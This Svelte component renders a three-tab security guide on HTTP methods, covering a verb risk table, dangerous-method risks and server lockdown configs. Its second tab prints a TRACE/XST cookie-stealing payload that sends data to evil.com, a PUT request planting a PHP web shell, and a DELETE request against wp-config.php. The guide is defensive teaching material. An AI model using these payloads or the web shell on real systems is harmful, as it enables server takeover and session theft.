<script lang="ts">
    import { X, GitMerge, Activity, AlertOctagon, ShieldCheck, ArrowRight, ChevronRight, ChevronLeft } from 'lucide-svelte';
    import { fade, fly } from 'svelte/transition';
    import { backOut } from 'svelte/easing';

    let { isOpen = $bindable(false) } = $props<{ isOpen: boolean }>();

    function close() {
        isOpen = false;
    }

    let activeTab = $state(0);
    const tabs = [
        { id: 0, label: "1. Method Inventory", icon: Activity },
        { id: 1, label: "2. Dangerous Methods", icon: AlertOctagon },
        { id: 2, label: "3. Method Lockdown", icon: ShieldCheck }
    ];

    function nextTab() {
        if (activeTab < tabs.length - 1) activeTab++;
    }
    function prevTab() {
        if (activeTab > 0) activeTab--;
    }
</script>

{#if isOpen}
    <!-- svelte-ignore a11y_click_events_have_key_events, a11y_no_static_element_interactions -->
    <div
        class="fixed inset-0 z-60 flex items-center justify-center p-4 sm:p-6 bg-overlay backdrop-blur-md"
        transition:fade={{ duration: 200 }}
        onclick={close}
    >
        <div
            class="bg-[#0A0C10] border border-orange-500/20 rounded-2xl w-full max-w-4xl overflow-hidden shadow-[0_0_50px_-12px_rgba(249,115,22,0.15)] relative flex flex-col max-h-[90vh]"
            transition:fly={{ y: 20, duration: 400, easing: backOut }}
            onclick={(e) => e.stopPropagation()}
        >
            <!-- Header Area -->
            <div class="relative bg-linear-to-r from-orange-950/40 via-orange-900/10 to-transparent p-6 border-b border-orange-500/10 shrink-0">
                <div class="absolute -right-20 -top-20 w-64 h-64 bg-orange-500/10 blur-3xl rounded-full pointer-events-none"></div>
                <button
                    onclick={close}
                    class="absolute top-4 right-4 p-2 text-muted hover:text-primary-text bg-glass hover:bg-orange-500/20 rounded-xl transition-all border border-subtle hover:border-orange-500/30 font-medium"
                    aria-label="Close guide modal"
                >
                    <X size={18} />
                </button>

                <div class="flex flex-col sm:flex-row items-start sm:items-center justify-between gap-4 relative z-10">
                    <div class="flex items-center gap-4">
                        <div class="w-14 h-14 rounded-2xl bg-linear-to-br from-orange-500/20 to-orange-600/10 flex items-center justify-center border border-orange-500/30 shadow-inner">
                            <GitMerge size={28} class="text-orange-400" />
                        </div>
                        <div>
                            <h2 class="text-2xl font-bold tracking-tight text-primary-text">HTTP Method Analysis</h2>
                            <p class="text-sm text-muted mt-1 max-w-md">Enumeration of allowed HTTP verbs including detection of dangerous unrestricted methods.</p>
                        </div>
                    </div>

                    <!-- Tab Navigation -->
                    <div class="flex bg-glass p-1 rounded-lg border border-subtle mt-4 sm:mt-0">
                        {#each tabs as tab (tab.id)}
                            <button
                                onclick={() => activeTab = tab.id}
                                class="flex items-center gap-2 px-3 py-1.5 rounded-md text-sm font-medium transition-all {activeTab === tab.id ? 'bg-orange-500/20 text-orange-300 border border-orange-500/20 shadow-sm' : 'text-muted hover:text-primary-text hover:bg-glass border border-transparent'}"
                            >
                                <tab.icon size={14} />
                                <span class="hidden sm:inline">{tab.label}</span>
                            </button>
                        {/each}
                    </div>
                </div>
            </div>

            <!-- Content Area - Scrollable -->
            <div class="flex-1 overflow-y-auto p-6 relative custom-scrollbar">
                {#if activeTab === 0}
                    <div transition:fade={{ duration: 200 }}>
                        <h3 class="text-lg font-semibold text-orange-300 mb-4">HTTP Verb Reference</h3>
                        <p class="text-sm text-muted mb-6 max-w-3xl">
                            HTTP methods (verbs) define the intended action of each request. RFC 7231 establishes their semantics — but many servers accept methods they shouldn't, creating security exposure. Understanding which methods are truly needed and which are dangerous is the first step to lockdown.
                        </p>

                        <!-- Method Table -->
                        <div class="bg-[#0d1117] rounded-xl border border-orange-500/20 overflow-hidden font-mono text-xs mb-6">
                            <div class="bg-surface/80 px-4 py-2 border-b border-subtle grid grid-cols-5 gap-2">
                                <span class="text-muted font-medium text-[10px] uppercase tracking-wider">Method</span>
                                <span class="text-muted font-medium text-[10px] uppercase tracking-wider">Intended Use</span>
                                <span class="text-muted font-medium text-[10px] uppercase tracking-wider col-span-2">Security Notes</span>
                                <span class="text-muted font-medium text-[10px] uppercase tracking-wider">Risk</span>
                            </div>
                            <div class="divide-y divide-subtle">
                                {#each [
                                    { method: "GET", use: "Read resource", note: "Safe & idempotent. No side effects expected. Must not change server state.", risk: "low", riskLabel: "Safe" },
                                    { method: "POST", use: "Create / submit", note: "Most common for form submissions and API mutations. Not idempotent.", risk: "low", riskLabel: "Safe" },
                                    { method: "HEAD", use: "Headers only", note: "Like GET but no response body. Used for cache checking. Generally safe.", risk: "low", riskLabel: "Safe" },
                                    { method: "OPTIONS", use: "CORS preflight", note: "Reveals allowed methods — increases attacker's knowledge of the attack surface.", risk: "medium", riskLabel: "Monitor" },
                                    { method: "PUT", use: "Replace resource", note: "Without auth, allows arbitrary file creation/replacement. Disable unless explicitly needed.", risk: "high", riskLabel: "Danger" },
                                    { method: "DELETE", use: "Remove resource", note: "Without auth, allows arbitrary deletion. Should require strong authorization.", risk: "high", riskLabel: "Danger" },
                                    { method: "PATCH", use: "Partial update", note: "Partial resource modification. Requires same auth controls as PUT.", risk: "medium", riskLabel: "Caution" },
                                    { method: "TRACE", use: "Debug echo", note: "Echoes the request back. Enables XST attacks to steal HttpOnly cookies via JS.", risk: "critical", riskLabel: "Disable" }
                                ] as row}
                                    <div class="grid grid-cols-5 gap-2 px-4 py-2.5 hover:bg-surface/30 transition-colors items-center">
                                        <span class="font-bold {row.risk === 'critical' ? 'text-red-400' : row.risk === 'high' ? 'text-orange-400' : row.risk === 'medium' ? 'text-yellow-400' : 'text-emerald-400'}">{row.method}</span>
                                        <span class="text-muted">{row.use}</span>
                                        <span class="text-muted col-span-2 text-[10px] leading-relaxed">{row.note}</span>
                                        <span class="px-2 py-0.5 rounded text-[9px] uppercase font-bold border w-fit {
                                            row.risk === 'critical' ? 'text-red-400 border-red-500/30 bg-red-500/10' :
                                            row.risk === 'high' ? 'text-orange-400 border-orange-500/30 bg-orange-500/10' :
                                            row.risk === 'medium' ? 'text-yellow-400 border-yellow-500/30 bg-yellow-500/10' :
                                            'text-emerald-400 border-emerald-500/30 bg-emerald-500/10'
                                        }">{row.riskLabel}</span>
                                    </div>
                                {/each}
                            </div>
                        </div>

                        <div class="bg-orange-950/20 border border-orange-500/20 rounded-xl p-4">
                            <h4 class="text-orange-400 font-medium mb-2 text-sm">Safe vs Unsafe vs Idempotent</h4>
                            <div class="grid grid-cols-1 sm:grid-cols-3 gap-3 text-xs text-muted">
                                <div><span class="text-emerald-300 font-semibold">Safe:</span> No side effects (GET, HEAD, OPTIONS). Browsers and crawlers may call these freely.</div>
                                <div><span class="text-orange-300 font-semibold">Idempotent:</span> Calling multiple times = same result (GET, PUT, DELETE). Multiple identical requests don't compound.</div>
                                <div><span class="text-red-300 font-semibold">Unsafe:</span> Has side effects (POST, PATCH). Not idempotent. Every call may create a new resource.</div>
                            </div>
                        </div>
                    </div>
                {:else if activeTab === 1}
                    <div transition:fade={{ duration: 200 }}>
                        <h3 class="text-lg font-semibold text-orange-300 mb-4">Dangerous Method Risks</h3>

                        <!-- TRACE / XST Attack -->
                        <div class="p-5 bg-red-950/10 border border-red-500/20 rounded-xl mb-6">
                            <div class="flex items-center gap-3 mb-3">
                                <AlertOctagon size={18} class="text-red-400 shrink-0" />
                                <h4 class="text-sm font-semibold text-red-300">TRACE Enables Cross-Site Tracing (XST)</h4>
                            </div>
                            <p class="text-xs text-muted mb-4 leading-relaxed">
                                The TRACE method causes the server to echo back the entire HTTP request as the response body — including all headers. When combined with an XSS vulnerability (even if the cookie is HttpOnly), an attacker can use JavaScript's <code class="text-cyan-300">fetch()</code> to send a TRACE request and read the echoed response body, which includes the <code class="text-cyan-300">Cookie</code> header. This bypasses HttpOnly protection entirely.
                            </p>
                            <div class="bg-[#0d1117] rounded-lg p-3 font-mono text-[11px] border border-red-500/20 space-y-1">
                                <div class="text-muted">// XSS payload exploiting TRACE to steal HttpOnly cookies:</div>
                                <div class="text-red-300">fetch('https://target.com/', {"{"} method: 'TRACE' {"}"})</div>
                                <div class="text-red-300 ml-4">.then(r =&gt; r.text())</div>
                                <div class="text-red-300 ml-4">.then(body =&gt; {"{"}</div>
                                <div class="text-red-300 ml-8">// body contains: "Cookie: session=abc123"</div>
                                <div class="text-red-300 ml-8">fetch('https://evil.com/steal?c=' + body);</div>
                                <div class="text-red-300 ml-4">{"}"});</div>
                                <div class="text-muted mt-2">// HttpOnly flag bypassed — session token exfiltrated</div>
                            </div>
                        </div>

                        <!-- PUT / DELETE Risks -->
                        <div class="grid grid-cols-1 md:grid-cols-2 gap-4 mb-6">
                            <div class="p-4 bg-orange-950/20 border border-orange-500/20 rounded-xl">
                                <div class="flex items-center gap-2 mb-3">
                                    <span class="font-mono font-bold text-orange-400 text-sm">PUT</span>
                                    <span class="text-xs text-muted">without authentication</span>
                                </div>
                                <p class="text-xs text-muted leading-relaxed mb-2">Allows an attacker to upload arbitrary files to the server filesystem at any path. Classic attack: upload a web shell (<code class="text-cyan-300">shell.php</code>) and then execute it by navigating to the URL — full server compromise in two HTTP requests.</p>
                                <div class="bg-[#0d1117] rounded p-2 font-mono text-[10px] text-red-300 border border-subtle">
                                    PUT /shell.php HTTP/1.1<br/>
                                    &lt;?php system($_GET['cmd']); ?&gt;
                                </div>
                            </div>

                            <div class="p-4 bg-orange-950/20 border border-orange-500/20 rounded-xl">
                                <div class="flex items-center gap-2 mb-3">
                                    <span class="font-mono font-bold text-orange-400 text-sm">DELETE</span>
                                    <span class="text-xs text-muted">without authentication</span>
                                </div>
                                <p class="text-xs text-muted leading-relaxed mb-2">Allows arbitrary deletion of server-side resources. An attacker can delete critical config files, database files, or the entire web root — causing permanent data loss or taking the site completely offline.</p>
                                <div class="bg-[#0d1117] rounded p-2 font-mono text-[10px] text-red-300 border border-subtle">
                                    DELETE /wp-config.php HTTP/1.1<br/>
                                    Host: target.com<br/>
                                    &gt; 200 OK (database credentials gone)
                                </div>
                            </div>
                        </div>

                        <div class="p-4 bg-yellow-950/10 border border-yellow-500/20 rounded-xl">
                            <h4 class="text-sm font-semibold text-yellow-300 mb-2 flex items-center gap-2"><ArrowRight size={12}/> OPTIONS Reveals Attack Surface</h4>
                            <p class="text-xs text-muted leading-relaxed">While OPTIONS itself is harmless (used for CORS preflight), the <code class="text-cyan-300">Allow: GET, POST, PUT, DELETE, TRACE</code> response header it produces maps out exactly which methods are available. An attacker uses this list to plan subsequent attacks. Disable dangerous methods so OPTIONS cannot reveal them.</p>
                        </div>
                    </div>
                {:else if activeTab === 2}
                    <div transition:fade={{ duration: 200 }}>
                        <h3 class="text-lg font-semibold text-orange-300 mb-4">Method Restriction Configuration</h3>
                        <p class="text-sm text-muted mb-6 max-w-3xl">
                            The principle of least privilege applied to HTTP: only allow the methods your application actually uses. Anything else should return 405 Method Not Allowed.
                        </p>

                        <!-- nginx Config -->
                        <div class="relative bg-[#0d1117] rounded-xl border border-orange-500/20 overflow-hidden font-mono text-xs mb-5">
                            <div class="absolute top-0 right-0 bg-orange-500/10 text-orange-400 px-4 py-1.5 rounded-bl-xl text-xs font-bold border-b border-l border-orange-500/30 tracking-widest uppercase">nginx</div>
                            <div class="p-5 overflow-x-auto pt-10 custom-scrollbar">
                                <pre class="text-primary-text leading-relaxed">
<span class="text-muted"># Restrict to safe methods at server block level</span>
<span class="text-cyan-300">location</span> / {"{"}<span class="text-muted">
    # Allow only GET and POST; deny everything else with 405</span>
    <span class="text-orange-300">limit_except</span> GET POST OPTIONS {"{"}<span class="text-muted">
        # OPTIONS needed for CORS preflight</span>
        deny all;
    {"}"}
{"}"}

<span class="text-muted"># For REST API endpoints that need PUT/DELETE:</span>
<span class="text-cyan-300">location</span> /api/ {"{"}<span class="text-muted">
    # More permissive — but requires auth middleware</span>
    <span class="text-orange-300">limit_except</span> GET POST PUT PATCH DELETE OPTIONS {"{"}<span class="text-muted">
        deny all;</span>
    {"}"}
{"}"}</pre>
                            </div>
                        </div>

                        <!-- Apache Config -->
                        <div class="relative bg-[#0d1117] rounded-xl border border-orange-500/20 overflow-hidden font-mono text-xs mb-5">
                            <div class="absolute top-0 right-0 bg-orange-500/10 text-orange-400 px-4 py-1.5 rounded-bl-xl text-xs font-bold border-b border-l border-orange-500/30 tracking-widest uppercase">Apache (.htaccess)</div>
                            <div class="p-5 overflow-x-auto pt-10 custom-scrollbar">
                                <pre class="text-primary-text leading-relaxed">
<span class="text-muted"># Allow only GET and POST at root level</span>
<span class="text-cyan-300">&lt;LimitExcept GET POST OPTIONS&gt;</span>
    Require all denied
<span class="text-cyan-300">&lt;/LimitExcept&gt;</span>

<span class="text-muted"># Explicitly disable TRACE in Apache</span>
<span class="text-cyan-300">TraceEnable</span> <span class="text-red-400">Off</span></pre>
                            </div>
                        </div>

                        <!-- API Authorization Model -->
                        <div class="p-4 bg-orange-950/20 border border-orange-500/10 rounded-xl mb-4">
                            <h4 class="text-sm font-semibold text-orange-300 mb-3">API-Level Method Authorization (RESTful Model)</h4>
                            <p class="text-xs text-muted mb-3 leading-relaxed">Infrastructure restrictions catch most cases, but API endpoints that legitimately use PUT/DELETE must enforce authorization at the application layer. Each route should verify the caller has permission before executing the operation:</p>
                            <div class="bg-[#0d1117] rounded-lg p-3 font-mono text-[11px] border border-subtle">
                                <div class="text-muted">// Express.js middleware example</div>
                                <div class="text-cyan-300">router.delete('/resource/:id', requireAuth, requireOwner, async (req, res) =&gt; {"{"}</div>
                                <div class="text-muted ml-4">// requireAuth: JWT/session valid</div>
                                <div class="text-muted ml-4">// requireOwner: user owns this resource</div>
                                <div class="text-cyan-300 ml-4">await Resource.delete(req.params.id);</div>
                                <div class="text-cyan-300">{"}"});</div>
                            </div>
                        </div>

                        <div class="bg-orange-950/20 border border-orange-500/20 rounded-xl p-4">
                            <h4 class="text-orange-400 font-medium mb-2 text-sm flex items-center gap-2"><ShieldCheck size={14}/> Cloudflare WAF Rules for Method Blocking</h4>
                            <p class="text-xs text-muted leading-relaxed">Cloudflare WAF allows method blocking at the edge — before requests reach your origin. In the Cloudflare dashboard under Security &gt; WAF &gt; Custom Rules, create a rule: <code class="text-cyan-300">http.request.method in {"{"}"TRACE" "CONNECT" "PROPFIND"{"}"}</code> → Block. This provides an additional layer even if your origin server misconfigures method restrictions.</p>
                        </div>
                    </div>
                {/if}
            </div>

            <!-- Footer Area -->
            <div class="bg-[#0A0C10] p-4 border-t border-orange-500/10 flex items-center justify-between shrink-0 shadow-[0_-10px_20px_-10px_rgba(0,0,0,0.5)] z-20">
                <div class="text-xs text-muted hidden sm:block">
                    Use <kbd class="px-2 py-1 bg-glass rounded mx-1 text-muted border border-glass font-mono">Esc</kbd> or click outside to dismiss
                </div>
                <div class="flex items-center gap-3 w-full sm:w-auto justify-between sm:justify-end">
                    {#if activeTab > 0}
                        <button
                            onclick={prevTab}
                            class="flex items-center gap-1.5 px-5 py-2.5 bg-glass hover:bg-glass-hover text-primary-text text-sm font-medium rounded-xl border border-subtle hover:border-glass transition-all focus:ring-2 focus:ring-glass outline-none"
                        >
                            <ChevronLeft size={16} /> Previous
                        </button>
                    {:else}
                        <div></div>
                    {/if}

                    {#if activeTab < tabs.length - 1}
                        <button
                            onclick={nextTab}
                            class="flex items-center gap-1.5 px-6 py-2.5 bg-orange-600 hover:bg-orange-500 text-primary-text text-sm font-semibold rounded-xl shadow-[0_0_20px_rgba(249,115,22,0.4)] transition-all transform hover:scale-105 active:scale-95 focus:ring-2 focus:ring-orange-500/50 outline-none"
                        >
                            Continue <ChevronRight size={16} />
                        </button>
                    {:else}
                        <button
                            onclick={close}
                            class="flex items-center gap-1.5 px-8 py-2.5 bg-emerald-500 hover:bg-emerald-400 text-emerald-950 text-sm font-bold rounded-xl shadow-[0_0_20px_rgba(16,185,129,0.4)] transition-all transform hover:scale-105 active:scale-95 focus:ring-2 focus:ring-emerald-500/50 outline-none"
                        >
                            Complete
                        </button>
                    {/if}
                </div>
            </div>
        </div>
    </div>
{/if}

<style>
    .custom-scrollbar::-webkit-scrollbar {
        width: 8px;
        height: 8px;
    }
    .custom-scrollbar::-webkit-scrollbar-track {
        background: transparent;
    }
    .custom-scrollbar::-webkit-scrollbar-thumb {
        background-color: rgba(255, 255, 255, 0.1);
        border-radius: 10px;
    }
    .custom-scrollbar::-webkit-scrollbar-thumb:hover {
        background-color: rgba(255, 255, 255, 0.2);
    }
</style>
